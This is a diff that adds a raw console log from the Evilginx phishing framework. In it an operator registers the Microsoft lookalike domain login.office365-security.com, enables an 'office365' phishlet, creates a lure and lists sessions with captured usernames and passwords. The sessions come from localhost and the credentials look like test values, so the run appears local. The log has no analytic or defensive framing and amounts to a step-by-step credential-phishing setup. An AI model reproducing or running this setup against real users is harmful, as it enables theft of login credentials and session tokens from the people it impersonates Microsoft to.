@@ -1,0 +1,55 @@
+
+                                         
+                                             ___________      __ __           __               
+                                             \_   _____/__  _|__|  |    ____ |__| ____ ___  ___
+                                              |    __)_\  \/ /  |  |   / __ \|  |/    \\  \/  /
+                                              |        \\   /|  |  |__/ /_/  >  |   |  \>    < 
+                                             /_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
+                                                     \/              /_____/         \/      \/
+                                         
+                                                        - --  Community Edition  -- -
+                                         
+                                               by Kuba Gretzky (@mrgretzky)     version 3.3.0
+                                         
+
+[10:16:00] [inf] Evilginx Pro is finally out: https://evilginx.com (advanced phishing framework for red teams)
+[10:16:00] [inf] Evilginx Mastery Course: https://academy.breakdev.org/evilginx-mastery (learn how to create phishlets)
+[10:16:00] [inf] debug output enabled
+[10:16:00] [inf] loading phishlets from: ./phishlets
+[10:16:00] [inf] loading configuration from: C:\Users\LENOVO\.evilginx
+[10:16:01] [inf] blacklist: loaded 0 ip addresses and 0 ip masks
+[10:16:01] [inf] executing: config domain login.office365-security.com
+[10:16:01] [inf] server domain set to: login.office365-security.com
+[10:16:01] [inf] executing: phishlets hostname office365 login.office365-security.com
+[10:16:01] [inf] phishlet 'office365' hostname set to: login.office365-security.com
+[10:16:01] [inf] disabled phishlet 'office365'
+[10:16:01] [inf] executing: phishlets enable office365
+[10:16:01] [inf] enabled phishlet 'office365'
+[10:16:01] [inf] executing: lures create office365
+[10:16:01] [inf] created lure with ID: 8
+[10:16:01] [inf] executing: lures get-url 0 username=admin@target.com
+[10:16:01] [err] lures: get-url: phishlet 'hackmysite' not found
+[10:16:01] [inf] executing: sessions
+
++-----+--------------+------------------+----------------+---------+------------+-------------------+
+| id  |  phishlet    |    username      |   password     | tokens  | remote ip  |       time        |
++-----+--------------+------------------+----------------+---------+------------+-------------------+
+| 1   | office365    |                  |                | none    | 127.0.0.1  | 2025-12-30 15:26  |
+| 2   | one          |                  |                | none    | 127.0.0.1  | 2025-12-30 15:11  |
+| 3   | rackspace    | m@mail.com       | mkmkdjkjksajd  | none    | 127.0.0.1  | 2025-12-30 17:24  |
+| 4   | yahoo-small  | mgHu@naujsk.com  | hjahjas        | none    | 127.0.0.1  | 2025-12-30 17:34  |
++-----+--------------+------------------+----------------+---------+------------+-------------------+
+
+
++--------------+-----------+-------------+-------------------+-------------+
+|  phishlet    |  status   | visibility  |     hostname      | unauth_url  |
++--------------+-----------+-------------+-------------------+-------------+
+| example      | disabled  | visible     |                   |             |
+| office365    | enabled   | visible     | login.office3...  |             |
+| one          | disabled  | visible     |                   |             |
+| owa          | disabled  | visible     |                   |             |
+| rackspace    | disabled  | visible     |                   |             |
+| yahoo-small  | disabled  | visible     |                   |             |
++--------------+-----------+-------------+-------------------+-------------+
+
+: 
